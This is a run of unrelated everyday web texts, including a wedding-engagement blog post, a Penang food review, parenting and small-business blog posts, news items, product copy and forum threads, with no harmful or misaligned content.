In addition to traditional applications, water technologies and innovations can improve a wide variety of processes such as semiconductor manufacturing, heating and cooling of buildings, oil & gas production, food processing, and many others.
We are interested in any technology or water related business that addresses the drastic transformation taking place in the way we produce, manage, and use water, or that improves industrial or other processes using water.Ross vividly remembers the day he first set his eyes on the woman he had no idea would become his bride. Kacy happen to walk past Ross’s cubical and he did an immediate 180 to see the beauty that just passed by. Though there was a mutual attraction, the two became friends for about three years playing volleyball on the beach, taking trips to Gainesville to watch the Gators play, hours talking on the phone and hanging out with mutual friends. Through their long chats “just as friends” they began to have deep conversations about their personal walks with God, their goals, advice, etc. While everyone encouraged them to date, they simply remained friends and Ross soon left to move to south Florida for work. They continued to speak every month or so, and through Kacy’s encouragement, Ross started attending church and grew into a deep relationship with Jesus Christ as his Lord and Savior. It was during this time that Ross learned to put God first, while at the same time Kacy was also drawing nearer to God. Although both of them did not realize it at the time, God was using this period to prepare them for one another. It wasn’t until they reconnected while Ross was in Jacksonville during a weekend in March 2012, that they realized God’s perfect plan was for them to be together! Over the holidays, Ross proposed to Kacy in Charleston and now they plan to have a short engagement so excited to begin their lives together and get rid of the distance of being in two different locations.
“We just want God’s presence to be known,” said Kacy when asked about their wedding plans. ”We just want it to be about Him and how He brought us together.” Kacy, 32, also wants single girls to be encouraged by her story that true love is worth the wait. ”You just have to wait on God, I keep telling my girlfriends that,” Kacy said. “As hard as it was to wait, I mean, look at what He brought me in the end, HELLO! He’s hot!” she said with a giggle and a blush.
Not only is Kacy now one of our lovely brides, she is also one of my best friends, and was a bridesmaid in our wedding, and I couldn’t be happier for my beautiful friend! Here’s some of our favorites from her and Ross’s engagement session!
I just LOVE all the colors in the session! INCREDIBLE you guys!
Words cannot even describe how beautiful the two of you are! What a gift to have such a talented friend to capture not only the outer beauty, but the inner beauty as well. God bless you!
Forever adorable KAcy! You captured her heart and soul so beautifully. Love the flying seagulls shot!
What a beautiful couple and beautiful photos!!!!
Amazing couple! Amazing photos! Congratuations Kacy and Ross. Scarlett, you’ve truly captured there inner and outer beauty and most importantly their love.
Love the photos of my sweet friend and can’t wait for the day they are husband and wife! To God be the glory!
Beautiful as always, Scarlett!3.11.14: The Probablility Of A Miracle, Who Owns A Selfie & Measuring Personal Intelligence!
The Improbability Principle
- Miracles don't happen every day, right? Statistician and Emeritus Professor of Mathematics David Hand argues that they probably happen once a month; it's not voodoo, it's math. His new book, The Improbability Principle: Why Coincidences, Miracles, and Rare Events Happen Every Day unlocks the data and shows why, what we think are miracles or flukes, are just a product of mathematical probability.

Who Owns The Rights To The Oscar Selfie?
If only Bradley's arm was longer. Best photo ever. #oscars pic.twitter.com/C9U5NOtGap
— Ellen DeGeneres (@TheEllenShow) March 3, 2014
- It is now known as the selfie that broke Twitter. When this year's Oscar's host, Ellen DeGeneres, corralled a group of Hollywood A-listers to squeeze together for a selfie, Bradley Cooper was the one holding the phone. So who owns the rights to this multi-million retweeted pic? Philip Bump from Atlantic's The Wire joins us to discuss copyright law in the age of the camera phone.
How Do You Measure Personal Intelligence?
- While the makers of the SAT are working to modify their ubiquitous test to be a more accurate measure of a student's potential, standardized tests really can't quantify emotional or physical intelligence. But what about personal intelligence? UNH Psychology Professor Dr. John D. Mayer is working on finding a way to measure the self and our interaction with our environment. We've got a link to the test right here.
- Dr. John D. Mayer will be speaking on Thursday, March 13th at the Water Street Bookstore in Exeter, NH. The talk begins at 7:00pm and will be followed by Q&A and a book signing. More information on speaking engagements can be found here.*Pure were totally enthusiastic when I mentioned “Lorbak“… so with the GPS and CK’s directions (it’s near Cititel Hotel!), we found our way to Kafe Kheng Pin located at 80, Penang Road.
I must admit I don’t have the best pic here to capture the total deliciousness of this Lorbak… do hop over to CK Lam’s post for better yummy pics!
When you enter this old-world kopitiam, you can see that every table will have at least a plate of these yummy fried fritters….
The stall selling the Lorbak is certainly the star attraction of this place and you have to wait quite a bit for your turn while the stall-owners frantically fry the batter-covered yummies in the huge wok of hot oil. I think we had about 3 plates of these – an assortment of meat/fish/seafood rolls, squids, prawn fritters, tofu etc! The crispy pieces disappear as soon as the plate is placed on our table!
Of course we also ordered other stuff while we were there – 3 plates of Lorbak were not enough to fill our growling tummies. So, let me show you what else we had…
Wantan Mee – with mushroom, cha siew and shredded chicken … average, I would say…
Ahhh… the Char Kway Teow was pretty good! According to LL & NL, this was gooodddd – and they proved it by ordering 2 plates! I had a couple of bites and I must say I agreed with the boys – there was enough wok-hei, the taugeh was crunchy and the noodles were very flavourful! They claimed that taste-wise, this is equivalent to the Giant Prawns CKT they had the day before and certainly much much cheaper!
Another good eat was the Chicken Rice. The auntie manning this stall warned me that I had to wait some time for my order. OK fine… so I waited like 20 minutes and still my chicken was not forthcoming. I went over and reminded her… guess what? She had totally forgotten my order even though our table was just behind her stall! Anyway, finally the plate arrived at our table….
… and boy, it was delicious & worth the wait! See the almost-translucent glassy skin of the chicken? – that was so smooth and succulent! The rice could have been tastier – it lacked the chicken oil/onions/garlic flavours but the superbly poached chicken made up for this shortcoming.
Needless to say, my plate of this yummy chicken was hijacked by the boys and we had to order a second plate – and that too was hijacked by them!… haiya!
We definitely will hunt this place down when we next visit Penang – you can be sure of that!
Once again, I’d like to thank CK Lam for introducing this place to us and it was lovely meeting up with her and her professional photographer, hehe!
aiyo..i also can be yr Pg guide!
Anyways..good tht u tried the CKT n lorbak here..indeed they are one of the best!
what a feast! it's like one great dish after another, right? hmmm, must remember to check out this place when i'm in penang. great stuff.
ok will go try one of these days… chicken rice looks good!!
can see that the Lorbak is good.
Ooh CK Lam did great – this is the ultimate Penang kopitiam, in my opinion. Every stall here is superb – we used to queue for close to an hour under hot sun to ta-pau the chicken rice.
TNG: But, but u are in KL wat!
Yes, those lorbak and CKT were great!
Nic: Yes, pls try – this must be 1 of the all-time favourites in Pg!
Claire: You are now such a Pg-regular, i'm sure you will hv the chance to try this!
Foodbin: Wahaha – so looks are not deceiving eh!
550ml: You not kiddin me – 1 hour??? Wow… you are reallyyy patient, lol! Luckily I didn't have to wait that long… but there were quite a lot of ppl waiting actually!
Agree, the lorbak here is really good!
my absolute fav Lor Bak stall as well.
I'll be staying in Cititel Penang in Nov… yay!! I can practically walk there and eat the lorbak and CKT!!!
Will utilise the short time to taste some of the best food there
nice foods
lorbak is the best after gym! too bad its so oily.. but the concept of fried protein is just too good to resist la:P
My MIL will stuff me silly with some top-class lorbak. Just can't miss the food from the Balik Pulau side.
Pete: Glad u agree, hehe!
J2Kfm: Ahh… so u agree too!
Leo: Yes, do walk over there – you'll like the food there!
trenddude: Thanks for visiting
Ciki: You can definitely afford to indulge la 😉

The goal of this cross-sectional study is to gain an understanding of the knowledge and attitudes regarding end of life issues and hospice care among a sample of residents of South Florida recruited through time and space sampling. This study is being conducted by OMS3 COM research fellow Heather Ruff as part of the research fellowship requirements.
Participants will complete a paper and pencil questionnaire that measures 4 domains of interest (advanced care planning; end of life care; hospice care and death and dying) as well as demographic factors (age, marital status, education etc.). It is estimated that the survey will take 15 minutes to complete. Data will be collected anonymously, with no personal identifying information. The instructions on the questionnaire state that by completing the questionnaire, the participant is providing consent to participate in the study. We will use time and space sampling methods to recruit up to 250 participants at community venues (i.e., beaches, street corners, parks, pedestrian malls, and other public venues were people congregate) in South Florida.

But, does this really help?
Results from previous studies and from a new study appear to say it does.
The researchers in the new study are observing over 75 families during mealtimes to see what factors may play a role in children’s eating behaviors – whether they are “fussy” or open to new foods. The initial results, presented this week at a psychology conference in the UK, show that friendly interaction, rather than pressure, may be more effective in encouraging children to try new foods.
Although these results are tentative and not yet published, they do mirror what I’ve seen in my work with young adults. I found that my clients who had healthy attitudes about food and better eating habits usually had parents with healthy attitudes and behaviors, and they tended to be relaxed about food and eating in their home.
A 2010 report by the American Dietetic Association Foundation showed that parents have more potential to influence their children’s behavior, including their eating habits, than anyone else. And, the report says, there has been a significant increase in daily family meals eaten at home, from 52 percent in 2003 to 73 percent in 2010.
A large meta-analysis from March 2011 looking at effects of family meals on children’s and teen’s nutritional health found that kids who share family meals 3 or more times per week are more likely to be in a normal weight range and have healthier dietary and eating patterns than those who share fewer than 3 family meals together. In addition, they are less likely to engage in disordered eating.
I think this is good news for parents. Focusing on three things appears to be a great start to putting your child on a healthy track:
1. Sit down to family meals at least a few times per week.
2. Model healthy eating behavior – try new foods and include a variety of foods in meals over time.
3. Keep meal times relaxed and avoid pressuring kids to eat.
Families do face challenges in sitting down to meals at home – time is one barrier. So, we’ve developed 5 meals that can be prepared in 30 minutes — each costing only about $6 each. You can find these meals and prep instructions here.
How often do you sit down to family meals? And please, share your strategies and menus with us.``If it had been any slicker tonight, it would have been Las Vegas,`` said Roger Daltrey after the Who`s benefit performance of the rock opera Tommy at Los Angeles` Universal Amphitheater.
The show, featuring special guests Billy Idol, Elton John, Phil Collins, Patti LaBelle and Steve Winwood, raised $2 million for children`s charities and the Rock `n` Roll Hall of Fame.
The audience included Madonna, Sylvester Stallone and Timothy Leary. At the post-performance bash, on the Universal lot, LaBelle noted, ``I used to open for the Who 20 years ago in London as Patti LaBelle and the Blue Belles, and Elton John was my piano player.``
John was reportedly the only one who didn`t make it to the rehearsal session the day before.
-- In Mozambique, 70,000 fans, some of whom had walked for several miles, paid between $1 and $2 to hear Eric Clapton perform at the King`s Trust concert.
(Clapton is the first international star to perform there.)
Prior to his African sojourn, the guitar great finished recording his forthcoming album, tentatively titled Journeyman, which features guest appearances by George Harrison, Phil Collins, Robert Cray, Chaka Khan and Daryl Hall.Thirty Russian academics with backgrounds in business entrepreneurship participated in a unique Taglit Birthright Israel project aimed at propelling new business initiatives. The closing program, inspired by technology and the world of Israeli entrepreneurship, took place last Thursday evening in Tel Aviv and included guests and representatives of Taglit, StarTau and business professionals, such as Dan Tochner – the evening’s keynoter – who encouraged those in attendance to “enhance your connection with those in the Jewish world.”
During the week, the entrepreneurs – from both Russia and Israel – visited factories and companies throughout the country and met with Israeli startup companies and Russian entrepreneurs living in Israel who have built successful entreprises. Selected Israeli high tech entrepreneurs accompanied the group for the entire tour throughout the country.
The event was part of a series developed by the GNF-Global Networking Forum, organized by StarTau, in order to assist Israeli entrepreneur’s access the worldwide markets through business entities and foreign governments operating in Israel.

Breakdown Albums
About Breakdown: There are 10 bands/artists with name "Breakdown". First band plays NY hardcore with elements of rap and metal. The NYHC Breakdown started in Yonkers, NY just outside of NYC. It consisted of Jeff (Vocals), Carl (Guitar), Don (Guitar), Rich (Bass), and Drago (Drums.) The band fused the thrash style of A7 style hardcore punk with a modern metallic crunch, influenced by crossover sound of bands like The Crumbsuckers, CroMags, and Agnostic Front. Their classic demo, released as a 7" and then CDEP on Blackout! Records set the stage for bands like Hatebreed and Madball.

He has been growing and learning more about fatherhood and has become more experienced through the years. Being steadily promoted from a father of one to now a father of three he has been actively engaging with the caring of the kids.
He handles the cleaning/ bathing of the kids since they were newborns and still does bath and feed Tiger girl when I’m engaged with her older brothers. I guess that practice makes perfect and with experience comes ease in handling of the kids physical needs.
He is the more relax parent compared to me. Maybe it’s because he gets more of the fun jobs of playing with the kids and bringing them out for fun instead on focusing on academics and discipline. Even though he and me don’t see eye to eye on certain issues regarding the kids we both agree that we need to co-ordinate our efforts in educating them.
I have learned from him not to be so uptight with the boys when they really drive me up the wall.He is really patient with the kids and has a really high tolerance to all their monkey antics. He will reason out with them before delivering any punishments if it is deemed necessary.
Tolerance is a virtue which I have cultivate throughout the years under his guidance. Although at times I still do snap at the kids when they drive me mad but it hasn’t been as often as before.
I guess that we do learn a lot from our spouse about how to improve on our parenting skills.
What have you learned from your spouse about parenting?
What’s the best tip you have had so far?

My husband is far greater at doing the things that interest them (even if he’s a little bored) than I am. He gets knee deep in some of their activities even if he has better things he could be doing.
Great post.
He does sound like a wonderful dad!
My husband is very giving. Isn’t it wonderful when we find the person that is right for us?
he sound like a great dad to have. I hope he have a wonderful father’s day!
he certainly does sound like a wonderful Dad, and how lucky that you can learn from him as well. Although I am betting he learns just as much from you.
my husband is by far much better at letting Zachary be indepenent than I am. If I were a SAHM, I would smother him to death! my husband is perfect with him and Zachary loves him soooo much – he regularly says “go see daddy?’ when I am playing with him hehe
I think dad’s in general just know how to have more fun with the kids. I”m not sure why?
@Dana,
I feel that guys are just wired more towards play which certainly favors well with kids.
Very nice D — nice tribute to your husband too.
DH is more in control of his emotions than me. This is somethng I definitely could benefit from.
The best tip I can offer is, step away from a bad situation before you react, then approach the problem after a few deep breathes with clarity and calmness.
What a good dedication post to your husband with Father’s Day just around the corner!

My boys lost their dad a long time ago, but in the few short years he had with them he was an amazing father. I think that my sons learned a lot from him, because they both have been wonderful fathers also…
Hubby’s patience seems to be quite the theme with this prompt this week. =) I’m glad so many people have such great men in their lives!
Hopping by to say Hi. Visiting from Katherines Corner blog hop. I enjoy photography but yet to perfect that hobby. LOL I follow you as Kathy B. Please come visit when you can, your always Welcome.
There seems to be many great advice here already and I can see most of them being beneficial. Dads are important in children’s lives. Dads seems to be the one somewhat less involved than the moms, but yet they have such a stronng bond even when they are at work, and moms stays home.
We learn from each other, even with prior parenting experience, I am still learning as the children change. We have different ways of being with the kids and I respect his approaches.
Oh darling just reading this made me cry.
I wish I could answer your question openly,, but it would put the husband in a not so nice light.
I’m so glad your husband is so wonderful about being engaged throughout the kids lives in everything.
*HUGS*
I’m really glad that more and more Daddies are so hands-on with the children now!
They’ve even installed changers in men’s rooms in older shopping centres who do not have the ‘family rooms’ which became a compulsory building addition since about a decade ago. Positive change!
I believe that every couple will ‘complement’ each other when it comes to parenting. Both parties can’t always be good / bad guys – and I think that you and R have managed to strike that balance wonderfully.
Men do have a way of approaching parenthood in a different way! I’ve learned a lot from my husband too in terms of having more patience and being more playful.
He sounds like a great dad!
What a wonderful tribute to the father of your children!
a tip–most things are not as bad as they seem. Everybody makes mistakes and must learn from them. They do grow up, will learn to like veggies (or not).. Actively loving them is the most important thing.
What a delightful Dad to link about!
Your husband sounds really neat!
Thanks for sharing him with us!

.
Legislator Judy Jacobs said while she’s likely to vote in favor of the proposal, she added she’s hopeful issues will be resolved ahead of the vote.
“I get the feeling they will work with us. Now I hope I’m right. If they will work with us and concerns come to the surface, then hopefully we’ll see a solution,” Jacobs told Xirinachs. “I certainly would be in favor of voting for this at this point because I don’t think it’s to anyone’s benefit to have something standing in the hub, which is really what’s really going to save Nassau eventually.”
Some of the concerns involved seating capacity and the project’s construction timeline.
The plan calls for the project to be built with private money at no cost to taxpayers.
The arena once hosted the Stanley Cup Finals and superstar performers such as Elvis Presley and Madonna. But it has become run down over the past four decades, and the Islanders are set to leave for Brooklyn following the 2014-15 season.
In August, Ratner’s group said it envisioned a renovated coliseum hosting championship boxing matches and college and minor league sports. The Islanders will also return to play six games a year there.
“We are ready to get to work to deliver a world-class coliseum and a thriving sports, entertainment and retail center that Long Island deserves,” Ratner said last month.
But economists told Newsday that, while the deal will bring in millions of dollars to the county, they’re concerned the coliseum won’t generate the revenue needed to pay $4.4 million in rent each year.
Ratner must now negotiate labor agreements and find a minor league hockey team to replace the Islanders. Ratner was behind Barclays Center, which in its first year brought in the most concert revenue of any U.S. arena.

wow! i'm so bummed to have missed out on that!
What an awesome event! I wish I could have been there, stitching and chatting away.
Teaching 75 people to embroider is no small feat, my friend - you should get a gold star!
yay, Rach! I'm so glad it was a smashing success! I read about this on the Sublime Stitching blog, and thought of you. Keep on rockin' the stitch, Mama.
I'm so glad everyone had fun! Thanks a ton to Leslie Bonnell for teaching this workshop with my patterns. Lookit all you people stitching. Aww....
Wow, how fun! I have a friend that wants me to give her an embroidery lesson. I never really learned myself----I just make the design work with basic stitches. I wish I could have attended your lesson to know what to teach others!!;-)
So fun! I just ordered transfers from Sublime Stitching, too. I'll have a little party of two on my own up here in the north...
Ohhhhhh! I'm jealous! Congratulations; I can see why you'd be so keyed up after a night light that. Crafting is deceptive... You *think* it looks tame and quiet, but it is really quite wild and liberating.
This looks so super duper fun!!!
Dang - that looks like a total blast! I'm definitely going to have to get my butt in gear and get down there the next time you do something like this!For only $4.95 we'll ship you seven samples of SoftSand and Asper Girt so you can decide which preparation is best for your application. In addition, we'll provide a voucher for $4.95 off your first purchase of SoftSand or Asper Grit.
When you need a grip with a soft touch...
SoftSand particles are rubber granules that offer a softer alternative to
sand and other hard materials when used in non-skid applications.
SoftSand rubber particles will help provide a comfortable, skid resistant surface,
and will work in most urethane, epoxy, and acrylic coatings. SoftSand
rubber particles can also be blended together, and used with paints to provide
truly unique, functional and decorative coatings.

When you need a grip that grabs you...
Asper Grit particles are polymeric granules for non-skid applications
where maximum asperity and traction is the goal. While most other polymer based
non-skid additives are based on relatively soft polyethylene waxes, Asper
Grit was selected from a thermoset polymer family that is known for its
hardness and toughness. It is an excellent alternative to traditional
sand as it does not contain free crystalline silica. It also weighs less than
sand so it doesn't settle as quickly when pre-mixed with paints.

View My BowsSome of you may remember me sharing that my sister went through a divorce last year, took about 18 months. She had a verbally abusive and on four separate occasions physically abusive husband. Well last Friday she found out she is losing her job, that she’s had for the past 10+ years, at the end of this month. And the reason they are letting her go is absolutely lame! She works for a Dr’s office and is on the business side,now all the sudden 10+ years later it’s an issue that she doesn’t have a Medical Assistant degree, not sure why all the sudden that’s an issue. Let’s face it most front desk people at the Dr’s offices I’ve gone to don’t have one. She knows more than most of the MA’s there and has been there longer than most of the employees.
I’m ticked off about it and worried for her. Was racking my brain last night trying to think of how I could help her. If you guys would please keep her in your prayers I’d certainly appreciate it. She’s been through a lot and this is just the icing on the cake right now.How are you living your Dash?May 9, 2013 at 7:25 am #577364 Back to Top REPORTMay 9, 2013 at 9:14 am #577375 Back to Top REPORTMay 9, 2013 at 9:29 am #577376 Back to Top REPORTWill pray for her. Things will work out somehow. Always does.
As for the ‘dismissal’ – I’ve seen that happen in a lot of places. Happened to me. I created and ran an IT dept in a school district for 10 years. I have a college degree and grad work. I retired and re-applied for the job but was ignored because I didn’t have a formal degree in IT. For the first 3 years they called me with their problems. I went back to work part-time last year to help them out and they called me back in again this year. I am told constantly from employees that they want me back.
My daughter is in the same boat. She works for a company that recently decided all new employees have to be ‘degreed’ and must also be degree certified to switch jobs. Crazy thing is, she fills in and does those jobs already.
My wife does not have a degree, but everyone at her office takes work to her to figure out and to write reports etc. The ‘college’ folks can’t seem to write worth a hoot.
So much for ‘degrees.’ Life lessons can be worth just as much or more than a college degree.May 9, 2013 at 9:55 am #577385 Back to Top REPORT

View My BowsSo a little more to the story. They brought all these medical assistants in and straight face lied to my sister and the other 4 desk girls telling them their job was safe not to worry you aren’t being replaced. They even let my sister train her would be replacement for 3 weeks to take her job (of course at the time she was told she wasn’t going to lose her job). How nice of them
There is no ethics in business anymore and it’s a crime the way people do business.
So my sister and 4 others lose their job and for going on this new program with all medical assistants the dr’s get a raise, how quaint is that! They have to keep my sister and these 4 others on till the end of the month and the Dr’s can’t even look at them, they walk by with their heads hanging because they know they screwed them and my sister has voiced that to a couple of them.
Because this is a large hospital owned company they at least can apply for another position within the company and if they find a job they want they have to be hired for it. However she could possibly take a 20% paycut because of this. She’s going to do that for now and keep looking to get out from underneath these lowlifes who care nothing about there employees.How are you living your Dash?May 10, 2013 at 5:19 am #577471 Back to Top REPORT

That is tough. That unfortunately is the way that more than one industry is heading. I know of a couple of people who only answer the phone at a insurance office who were required to become registered agents. Of course, their company paid for the prep classes and their test, but keeping their job hinged on their completion and successful
test. Also, heard of this being part of real-estate office requirements for a few.

Prediction of health of dairy cattle from breath samples using neural network with parametric model of dynamic response of array of semiconducting gas sensors
UNSPECIFIED. (1999) Prediction of health of dairy cattle from breath samples using neural network with parametric model of dynamic response of array of semiconducting gas sensors. IEE PROCEEDINGS-SCIENCE MEASUREMENT AND TECHNOLOGY, 146 (2). pp. 102-106. ISSN 1350-2344Full text not available from this repository.
Abstract
The authors report on the use of a sampling device to collect the breath from individual members of a herd of dairy cattle juring a two-week period. The response of an array of sis semiconducting oxide gas sensors to the breaths samples has been recorded and subsequently modelled by a time-dependent, linear, second-order system. Four characteristics sensor parameters have been estimated using a neural network;. and these parameters have been used to train a predictive multilayer perceptron network. The results show that either a static response parameter (based on the difference in the signal from zero time) or a single time constant can be used to predict reasonably well the health of the cow as judged against blood samples. In both cases, the identification rate of unknown samples being about 76%. Further improvements may be possible through the use of network compensation of variation?; in sample temperature and humidity.

Is it possible that telepathy works on the distance of few kilometer, correct and all the time?
I can not find any official. Why this telepathy madness?
At Edinburgh University, experts conducted controlled experiments to see if telepathy is possible.
Vinko maybe can give evidence for it but why they do not make an experiment with Vinko or Uri Geller?
Why are Schneider's symptoms of the first rank for Schizophrenia exact the same as Vinko's telepathy?
Is CIA's remove viewing project just a bluff because telepath's like Vinko can never find out who actually
is sending to them , also receiver or sender can never localize each other.
I think it is in interests of science and human kind to make some really research on Vinko and Uri.

You might have a way of running things, or a certain vision for your business. If an outsider gives you feedback, you might dismiss it thinking, “What do they know about running a studio?” or “Ugh, I don’t have time for this!” Or you might just perceive it as a complaint rather than a suggestion.
Having an attitude of I-know-what’s-best-for-my-studio is exactly the kind of attitude that often times holds studio owners back from having a flourishing business. At BizeeBee, we often see this as one of the signs that a studio is going to be closing down their business soon.
Successful studios have learned to blend and balance feedback from their community.
However, we understand that as an owner you cannot listen to everyone! Here are 3 tips for how to evaluate feedback from folks within your community to figure out if you should incorporate it into your business.
1. Is the feedback aligned with current business goals?
Let’s say that for example you have a goal that by the end of the year you’d like to attract more members to your studio. So if someone comes up to you and offers a suggestion on how you can attract more members, then it might be worth at least taking the time to listen to.
The key is to ask some follow up questions like, “Do you know any other studios that have done what you’ve suggested and seen results?” and “Would you mind putting me in touch with them?”
The reason you’re asking these follow up questions is to get more details on how the suggestion was actually implemented, and if it was in a studio like yours. You want to be sure that the suggestion actually applies to your business’ situation.
2. Is the person who is giving you feedback reputable?
If this is the first time you’re interacting with the person, who is giving you feedback, it can be hard to gauge whether they are a reputable or credible source. It’s up to you to give them the benefit of the doubt. You can start by digging into their background a little by saying something like, “That’s an interesting suggestion. I’m curious to know what your background is?”
It’s possible that they might be a studio owner themselves, a business coach, or someone in the biz who has a lot of experience.
But if they are just some schmuck off the street, then clearly you can thank them for the suggestion and move on!
3. Can you try to implement a portion of their feedback?
There are those who think BIG, and offer a suggestion that you wish you could implement in your studio but you just don’t have the resources!
In this case especially, it’s important to take a step back, and say something like, “Wow that is a great idea! Unfortunately, I don’t have the resources to make it happen. Can you think of a way that maybe we could implement a portion of it or scale it back a bit?”
Put a little pressure on them to think through their own suggestion. If they are really interested in seeing you flourish they will take the time to refine their suggestion and come back with something a little more bite-sized for your business.
Now at BizeeBee, we want to know have you recently taken a suggestion from a member of your community? If it did end up benefiting your business, what were the steps you put in place to make it happen?]]>
Last week I had the pleasure of meeting up with one of our BizeeBee customers Michele, who owns a Zumba business. Michele operates as a studioless business, in which she and a group of Zumba instructors whom she manages, teach out of a community center in North Carolina. Michele has been operating her Zumba business for a little over 6 months. However, running businesses isn't new to Michele. She's built up a number of them, and has been able to do so successfully, because she understands the importance of having a system in place! When she discovered BizeeBee 6 months ago, she was searching for a solution that would help get her business off the group. What drew her to BizeeBee was that it was simple solution that met the needs her small but growing Zumba business.
Since joining BizeeBee, Michele and I have been exchanging emails for awhile, and finally decided to meet up. At BizeeBee, we make it a point to meet up with as many of our customer as we can periodically. It helps us to get a better understanding of how they use BizeeBee, and if there are any needs that are going unfulfilled.
During our meeting, Michele's objective was to understand how she could leverage the product to do more. I began by pointing her to a couple resources that she wasn't familiar with. The first was our set of short video tutorials, which we've created to make it easier for business owners to get setup, and for them to be able to train staff without having to actually train staff.
Next, Michele wanted to know how to see all her attendance data. Her goals were to understand how many students were coming to each class by day and by month. So I took her on a little tour of the Dashboard. I pointed out how she could start by filtering based on a date range. Then she could see all the classes that were taught for that date range, along with the types of classes, and the total attendance. Next if she clicked into a particular month she could get a daily view of attendance. Finally, if she wanted to know the performance of each of her instructors, she could switch over to the instructor graph, and see how many students were coming to each instructor's class, and do the same daily drill down.
I also learned a lot from meeting with Michele, and I realized that we need to do a better job of showcasing how to use our product so that business owners like Michele can get the most of out it.
Making it a point to meet with as many of our customers as possible has enabled us to understand what is and isn't working for them. While each customer may have specific needs, we try to take into consideration those specific needs to see if any of them fit into a general solution. If they do then we'll incorporate it, if they don't then we'll either do our best to address their needs individually, or wait until we reach a critical mass for the request. Ultimately, we want to stick by our principle of simplicity to service small fitness businesses.]]>
While working in the yoga industry in various capacities since 2008, Kara and Mel noticed that though the yoga industry in US is propelling to a $10B industry, yoga teachers barely make ends meet each month. A large number of seasoned teachers who put in a lot of extra effort to make classes and trainings fantastic, but aren’t being compensated for their efforts. This was the problem that inspired the birth of: The Yoga Recipe, the goal being to foster the teacher-teacher relationship.
The Yoga Recipe started with a mission to create an energy and monetary exchange between seasoned and new teachers that elevates both the yoga community and most importantly the students. Unlike most of the resources available, The Yoga Recipe is based on teacher resource and focus on teacher-teacher relationship.
The Yoga recipe was launched in May 2013 and is currently in beta phase. The Yoga Recipe team is working hard to improve the application based on the feedback they are receiving from yoga teachers. The team is taking every call and email seriously! Incorporating new features to the application based on the feedback they receive in order to build an application that will truly help and improve teachers' lives. Being 100% self funded till now, The Yoga Recipe is also open for potential investors that share their passion and interest in expanding The Yoga Recipe and offerings.
After receiving BS in Business Marketing from the University of Wisconsin - La Crosse in 2008, Kara joined yoga-retailer Lululemon Athletica. In 2011 Kara took her yoga practice to another level and completed Gioconda Parker's 200-hour teacher training program. At Lululemon Athletica Kara met Melissa Frontino, aka Mel. Mel received undergraduate degree from Bowling Green State University in Ohio, in Communications and Marketing. After gaining experiences in medical sales industry she was inspired to pursue the following:
Connect with people in an authentic way
Be a part of the yoga community every day
Share possibilities with as many people as she could
BizeeBee is thrilled to showcase the efforts of Kara and Mel as they continue to build The Yoga Recipe. If you’re a yoga teacher checkout The Yoga Recipe today!]]>
Welcome back to another episode of Sustainable studio series! I'm Poornima the CEO & Founder of BizeeBee, I know you're passionate about your business, but you need to balance pursuing your passion with some business intelligence.
Since many of you are bizee building I've come up with this sustainable studio series. In this video series we will explore 1 suggestion every week to help you build a sustainable studio business!
Even if you're a private instructor and don't have a studio you can make use of these suggestions to build a sustainable business.
In the past few episodes we covered systems you need to put in place to create a sustainable business like marketing and financial tracking systems.
In this next set of episodes we're going to cover some of the touchy subjects that are holding your business back from becoming a sustainable business!
One of the main issues I see time and time again that hold business owners back from building a sustainable business is pricing.
In today's episode I'm going to encourage you to not be a pushover when it comes to pricing!
I know its a recession out there but if you don't price your services correctly you'll be facing a depression!
Let's first cover why you need to be pushy?
I know you're passionate, and would share your service with your customers for free! But have you ever noticed that even when you giveaway things people sometimes don't bother to show up? Or worse yet they take advantage of something that is free or discounted. That's because you are undervaluing your service and as a result so are your customers.
The most effective and standard way to convey that what you are offering is of high value is through by price.
I know you're going to tell me that other businesses around town are cheaper. Great! They have most likely worked out a magic formula that covers all their operating costs and turns a profit. Or they might just be deluding themselves. Don't worry about those folks. Think about your business and what you need to make in order to become profitable.
So now let's talk about how you effectively price.
The first thing you need to do is figure out what you your number is i.e. what you absolutely need to make either per hour, day, class or whatever your basic unit is. Stick to this number! Do not go below that number. Going below the number will not lead to a sustainable business.
The reason you need to figure out your number is because you will start to believe that is your number and you will be genuine when you convey it to your customers.
If a customer scoffs at your price, you could explain to them kindly why your rates are as high as they are. For example, if you are teaching private class you need to factor in the cost of gas or a train ticket to get to the customer. Or your business might be in a high rent district.
Not every customer cares or is willing to listen, but some might understand. And you'll be surprised at the number of customers who actually come back to you despite your price if you do indeed follow through with a quality service.
There are those who might walk away, but truthfully servicing at a lesser price is actually putting your business in jeopardy, because you're now paying to service them!
The important point is to stand your ground and know your value. I've come across many businesses in the past couple years whose owners kept discounting, and eventually went under because of it.
To recap, I know it seems like everyone is price sensitive these days, and they are. But you still need to value your service and have others value it. Figure out your pricing, what that number is, stating it boldly, and not budge on it because that's what is going to help you build your sustainable studio!
Thanks and we hope you have a great day!]]>
You have been hooked to yoga for years, practicing consistently, and now you wish to share your knowledge of the practice with others by becoming a yoga instructor!
As you embark on this new journey, you might decide to work at a yoga studio, and teach private lessons as well. If you have even the slightest interest in turning your teaching practice into a business then you’ll need to think about how you’re going to keep track of your students. Your students will become your initial client base.
Given that you’re operating with limited time and resources, we came up with a solution to help private instructors such as yourself focus on what you love to do, teach! By incorporating a BizeeBee online store into your website you’ll get paid and keep track of students easily. No need to go through an enter data each time you each. Or worry about getting paid on time. Setting up is a cinch!
Here’s an example of what your online store will look like:
Here’s an example from one private yoga instructor’s site:
So if you are about to start your career as Yoga Studio give us a chance to make it easier for you and sign in for BizeeBee online Store.
Need help setting up your online store, feel free to reach out. We’re available via email, chat, or give us a call at 650.489.6233. We look forward to helping you grow your business!
Namaste!

Because we're great fun and unique!
Because just being near us causes them to become sentient. We're brilliant.If you’ve been using Facebook, Twitter, FourSquare or Google Reader for more than a couple of weeks, you’ve undoubtedly had the experience of reading about a party you weren’t invited to, a movie you haven’t seen or a conference you couldn’t attend. And since you’re an incredibly mature, enlightened person, you feel a warm sense of gratitude for living in an age where you can vicariously enjoy all of these other social and professional opportunities that you don’t have the knowledge, time, money or relationships to experience for yourself.
Or maybe you just occasionally feel the pain of FOMO: Fear of Missing Out. Because.”
Going all Buddhist-y is one way to tame the FOMO pangs; writing in the imagined second half of a tweet can help, too. But sometimes things grow really desperate, like when you spot an online convergence of every single person you know, every single person you should know, and in fact, every single person on the entire planet who matters at all….except you.
